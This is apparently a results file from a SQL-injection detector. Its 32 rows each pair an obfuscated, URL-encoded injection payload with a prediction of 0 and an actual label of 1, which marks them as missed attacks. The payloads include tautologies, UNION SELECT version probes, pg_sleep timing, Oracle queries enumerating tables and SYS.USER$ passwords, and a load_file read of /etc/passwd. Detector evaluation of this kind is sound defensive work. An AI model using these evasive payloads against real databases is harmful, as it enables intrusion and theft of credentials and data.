,Query,Prediction,Actual
0,"%20"" O%52 2*%33-6%20O%52 %32/%32-1 Or 8-%38 oR%20p%67_sleep%20 (%20 %5f_T%49M%45_%5f %20) %20--%20",0,1.0
1,%63rea%74e%20u%73e%72 %6eame%20id%65n%74ified%20by pass1%323%20t%65m%70or%61r%79 %74ab%6ces%70ace t%65mp %64efa%75l%74 tabl%65space%20u%73e%72s%3b ,0,1.0
2,%20&%26 %31 %61nd%201%20&%26 %200+%32*%33-%36+%31=%32*3-%36+%32/2%2d1%2b0+0+%75t%6c_%69n%61d%64r.g%65t%5fhost%5fa%64dr%65ss%20 %20(   %20( %20 %53E%4cEC%54 D%49S%54INCT%20 %28 %20tab%6ce_na%6de  )%20  %46RO%4d  %20(%20 %53EL%45CT D%49STIN%43T %20(  %74a%62l%65_n%61me %20)%20 %2c R%4fW%4eU%4d A%53 L%49M%49T %46R%4fM%20sys%2eal%6c_%74a%62les%20 %29 %20 %57H%45RE%20 %53I%4e(%30)%2b2/2-1+L%49MIT%2b8-8%2b2%2a3-6+%32/%32-%31=2/2%2d1%2b5+2%2f2-%31+2%2a3-6%20 %20)%20  %20)%20 %20 %41ND %20SI%4e(%30)+S%49N%280%29+%30+%27i%27+%30=%32*3%2d6+%38-%38+'i%2bSIN(%30)+2%2a3-%36 ,0,1.0
3,"%20s%65lect %2a %66rom%20u%73er%73 w%68er%65  %38-8+%32*%33-6+id+%53I%4e(%30)+0%2b2*3%2d6=%32*%33-6%2bS%49N%280)%2b2%2f2-1%2b8-8%2b'%31'+%38-%38 %6fR%20S%49N(0%29 O%72 %32*3-%36 O%52 @  2*%33-6%2b8%2d8%2b2%2f2-1+@%31+2%2f2-%31=%31+%32/%32-1+%30+%53IN%280) un%69on%20sele%63t %31,ver%73i%6fn%20 %28  %20 )  %20-- 1' ",0,1.0
4,"%20se%6cec%74 *%20fro%6d us%65r%73 wh%65r%65 %202%2f2-%31+id%2b2%2f2%2d1=2%2a3-6%2b1+2*3-6+2%2f2%2d1 |%7c %38-8%20O%52 %32*%33-6%20o%72 1%23 ""  %28 %20 %75ni%6fn%20se%6ce%63t%201,%76ersi%6fn %20(   %20)%20 %20--%201 ",0,1.0
5, sel%65ct%20name%20fro%6d sys%63ol%75m%6es %77h%65re %200%2b2%2a3-%36+%69d%3d2/2-%31+0+(+2*3-%36+2/2%2d1%20 se%6cect %69d %66r%6fm %73y%73o%62je%63t%73 w%68ere%20 8-%38+%53I%4e(0)%2bS%49N(%30)+%32/%32-%31+%6eam%65+%30=%38-%38+2*%33-%36+2*%33-%36+0+%74a%62l%65name'  %29  -%2d ,0,1.0
6,%73e%6ce%63t%20* f%72o%6d %75sers %77h%65r%65  %30+2*3-%36+id+2/%32-%31+2%2f2%2d1=%32*%33-6%2b2%2a3%2d6%2b1+2%2a3-6%2bS%49N%280%29+%32*3-6 +%24+ O%72 %32/%32-1 ||%202*3%2d6 %7c|  %53I%4e(0%29+8-8%2b0+%31+%53I%4e(%30)=2*3%2d6%2b0+1%2b2/2%2d1%20--%201 ,0,1.0
7,"%31;%20 %28  l%6fa%64_fi%6ce%20 %28  %63ha%72  %28 %204%37,%310%31,116%2c99%2c4%37,11%32,%397,%311%35,%3115%2c11%39,%3100  %20)  %20 ) %20   )%20 ,%31,1,%31;%20",0,1.0
8,"%20s%65l%65ct *%20from u%73ers%20wh%65r%65 %202%2a3-%36+%69d%2bSI%4e(0%29=%30+%30+'%31'%2b0%2bSI%4e(0)%2b2%2a3-6%20o%52 S%49N(%30)%20O%72 %30 or %20SIN%280%29+%7c|%2f1+%32*%33-%36=%53IN%280%29+1+8-%38 %75n%69o%6e %73e%6cect%201,%76e%72s%69o%6e %20(   %20)  %20--%201%27 ",0,1.0
9,"%20s%65l%65c%74 %2a f%72om%20u%73er%73 where %20id%2bS%49N%280%29+2*%33-6%2b2/2%2d1%2bS%49N(%30)=0+%271%27+0+0%2b0%2b8%2d8 %4fr %32/2-%31 O%72 %32/%32-1 %6fR \%2e<%5c u%6ei%6fn %73e%6ce%63t%201,@%40V%45RS%49O%4e -%2d %31' ",0,1.0
10,?%20Or%202*3-%36 %6fr%20 %38-%38+2/%32-%31+1+%32/%32-1+8-%38=2%2a3-%36+%32*3-%36+1+0%20-%2d ,0,1.0
11, )%20  Or%20SIN%280)%20or %32/%32-1%20Or%200%20Or%20  (  %200%2b2%2a3%2d6+%27a'+2%2f2%2d1+%32/%32-%31+8%2d8=%38-8+%30+%27a+%32/2-%31+SI%4e(%30)+8%2d8%20,0,1.0
12,%61d%6di%6e'%20Or%208-8 %4fr %200%2b0+%32*%33-6+1=0+%31+%32/%32-%31+2/2%2d1%2b8%2d8%2b2%2f2-%31 #,0,1.0
13,"%20se%6ce%63t%20*%20from %75s%65rs wher%65  %30+%38-%38+%69d%2b0%3dS%49N%280%29+%31+0+SIN(%30)%2bSIN%280)%20OR%208%2d8%20OR%20S%49N(0%29 o%52 SIN%280) O%72 %20""%20 (%20 %5d %22 %6fr%20S%49N(%30)%20O%52  %30+%32/2%2d1+%32/%32-%31+2%2f2-%31+%31+%32/2%2d1=%38-%38+%31+2%2a3-%36+%32*3-6%20-%2d %31 ",0,1.0
14,%6fr%20 0%2b8%2d8%2b1%2b2/2-%31=%30+%31+%32*3%2d6%2b2%2a3-%36+%38-8%20-- ,0,1.0
15," A%6ed %31 a%6ed%201%20AN%44 1 %41nd%20 0%2b0%2b1%2bSI%4e(%30)%3d0%2but%6c_i%6ea%64d%72.%67e%74_h%6fst%5fadd%72e%73s+%30+%30+%53IN(%30)%2b0%20 %20( %20 %20(%20 %20S%45LE%43T%20D%49STINC%54 %20(%20 %63o%6cum%6e_na%6de %20)%20  %46R%4fM %20 (%20 %53E%4cEC%54 %44I%53T%49N%43T %20(%20 c%6flu%6dn%5fna%6de %20)%20 , ROW%4eU%4d %41S%20L%49MIT%20F%52O%4d %61l%6c_t%61b_co%6cu%6dn%73 %20)%20 %20WHER%45 %20LIM%49T+8-8+%38-%38=%38-%38+%38-%38+%30+%35+SI%4e(%30)+%30 %20 %29 %20  %29  %20 AN%44  %27i'%2b0+%38-%38+%53IN(0%29=2%2f2%2d1+%53IN%280)+'%69+%38-8+%32*3-6%2b8%2d8 ",0,1.0
16, sel%65c%74 *%20from%20u%73e%72s w%68ere%20 2*%33-%36+%32*3-6%2bi%64+%38-8+0%2b0%3d0+%32*%33-%36+0+'1'%2b2%2f2-1 %25!<%40 %75ni%6fn%20s%65lect%201%2cv%65rs%69o%6e  (  %20 %29 %20 %2d-%201'%20,0,1.0
17,"%20se%6ce%63t%20*%20f%72om%20use%72s %77h%65r%65 %202%2a3%2d6%2b8-8%2b2/2-%31+id=1+8%2d8+8%2d8+SI%4e(0%29+%30+8%2d8%20o%72 2/2-%31 %4fR %20""%26  %28 %20 %22 Or%208-%38 or%20 2/%32-%31+2*3%2d6%2b0%2b1%2b0%3dSIN%280%29+%53I%4e(%30)+%32/2%2d1%2b1%2b2%2f2-%31+%30 -%2d 1 ",0,1.0
18," sel%65c%74 * f%72o%6d use%72s w%68er%65 %202*3-%36+%32*%33-%36+8-8+id%2b2%2a3%2d6%2b8-%38=%32/%32-%31+0+2/%32-%31+1%2b8%2d8+%30 O%72 %38-%38 %4fR%200 o%72 %53IN%280)%20|%7c  ""%3f  %28 %20 %22 O%52 8-8 O%52 %30 %4fR  %30+2*%33-6+%31+%38-%38=%30+%32*%33-6+1%2b2*3%2d6%2b2%2a3-%36 -- 1 ",0,1.0
19,%64ist%69n%63t%20,0,1.0
20,%73el%65c%74 *%20f%72om us%65rs w%68e%72e %208-8+2%2f2-%31+i%64+%32/%32-1+%32/%32-1%3dSI%4e(0%29+2%2f2-%31+2/%32-1+'1%27+%38-%38+0%20*%20 %28 %20\%20 ) %20 oR%202%2f2%2d1%20or%200%20o%72 %208%2d8+%32*%33-6%2b1+0%2b0%2b2/%32-1=%30+1+%53I%4e(%30)+S%49N(0)+2*3%2d6+%30 %2d- 1%27 ,0,1.0
21,"%31 %61N%44 1 a%4eD asc%69i %20(%20 l%6fwer %20(%20 %73u%62str%69ng%20 %20( %20 %20(   %73e%6ce%63t t%6fp %31 %6ea%6de%20f%72om%20syso%62j%65ct%73 %77h%65re %20xty%70e%2b0%2b0=S%49N(0)%2b'u%27+2%2a3-%36+%38-8%2b2%2a3%2d6 %20)  , %31, %31 %20 %29    %29  %20  %29 %20 %3e 116%20",0,1.0
22,%73elect%20* %66ro%6d %75s%65rs%20whe%72e  0+%69d+2%2a3%2d6%2bS%49N%280%29+%30+%53I%4e(%30)=%53IN%280)%2b1%2b0%2bS%49N(0%29 %6fr%208-8%20OR%20\%2e<\%20o%72  0+%38-%38+1+%32*%33-6%2b0+%32/%32-1=%31+%32*3%2d6%2bS%49N(0%29+0%20--%201 ,0,1.0
23,"%61d%6din%20"" %4fr 0%20OR%20 %221 "" %30+0+%3dS%49N%280%29++0%2b2%2f2%2d1%20""%31 %22-%2d ",0,1.0
24," %73el%65c%74 %2a %66rom%20us%65rs %77h%65re %208-%38+%32/%32-%31+S%49N(%30)%2bid%2b0=%30+%31+%32/2%2d1+%30+%32/%32-%31+%38-8%20Or %32*%33-%36 %4fr %20""%25{%20"" %6fr 0 o%72  %53IN(0)+%31+%30+S%49N(%30)%3d1%2b0+SI%4e(0%29 %2d-%201 ",0,1.0
25,in%73e%72t%20,0,1.0
26," %73el%65c%74 * f%72om use%72s %77here%20 %32/%32-1%2b8%2d8+2%2f2%2d1%2bid%2b2*3-%36=0+%32*%33-6%2b1+%30+2/2%2d1+%32*3%2d6 %4fR%200%20O%52 %31#%20""%20?+0%2b2*3-%36+%32*%33-6=8%2d8+%32*%33-%36+2/%32-1+1+%32*%33-%36 |%7c 2%2a3%2d6%20O%52 2%2f2%2d1%20|| 0 %6fr%20 %32*3-%36+2%2f2-%31+8%2d8%2b1%2b0%2b2/2-%31=%30+%32/%32-%31+1%2b2*3%2d6%2b2%2a3-6+%53I%4e(0%29 -%2d 1 ",0,1.0
27," %73e%6cect%20* from%20user%73 %77he%72e%20 %30+0%2bi%64+%32*%33-%36+0+SIN%280%29=%53IN%280)%2b2*%33-%36+1+%32*%33-%36+0%20or %32/2%2d1 Or%20 ""%25? ""%20OR%208-%38 Or%20 %53I%4e(0%29+%31+0=%32*3%2d6%2b0+%31+%32*3-%36+%38-%38 %2d-%201 ",0,1.0
28," A%4eD%201%20aND 1 a%4ed%201 %61N%44 1 aN%44 %202*%33-%36+%31+2/%32-%31=2%2a3-6%2bu%74l%5fin%61d%64r%2eget_%68o%73t_a%64d%72es%73+2/2%2d1+%30  %20(    (   %53ELE%43T%20DI%53TIN%43T  %28  PASS%57O%52D%20 %29  %20FROM %20 (%20 S%45LE%43T %44I%53TIN%43T  %28  %50A%53S%57OR%44  ) %20, %52O%57N%55M %41S%20L%49M%49T%20F%52O%4d S%59S.%55SE%52$%20 %29 %20 %57H%45R%45 %20SIN%280%29+L%49MIT%2b8-%38=%38-8%2b2%2a3%2d6%2b8%2d8+8  %20) %20 %20)%20  %20A%4eD %202/2%2d1%2b'%69'%2b8%2d8+%32*3%2d6%3dSI%4e(0%29+8-%38+%27i+8-%38+SI%4e(%30)+SI%4e(%30)%20",0,1.0
29,"%20s%65lec%74 %2a %66r%6fm%20u%73e%72s%20wh%65re  %69d+8-8%2bS%49N(%30)%3d8%2d8+%32/%32-%31+0+%31+%53IN%280)%20O%52 2/%32-%31 %6fR 2/%32-1%20||%20 %22?%23 ""%20O%72 %30 %6fr %201%2b8%2d8%2b2/%32-1=%32*%33-6%2b1%2b8%2d8+%32/2%2d1%20-%2d %31 ",0,1.0
30,"%6fr %202/2%2d1+0%2b1+%38-8%2b8-%38=2*%33-%36+2%2a3-%36+%31+2*%33-6 %4fR%202/2-1 %6fR %32/2%2d1 ||%20 "" %22 8%2d8+%2b2%2f2%2d1%2bS%49N%280)%3dS%49N(%30)%2b+%32/2-%31+S%49N(0%29 ",0,1.0
31, 8%2d8%2b2/2-1%2b0+%30+8-%38+%2f*%2a/or/**%2f1/**%2f=2%2a3%2d6+/%2a*/%31+0%20,0,1.0
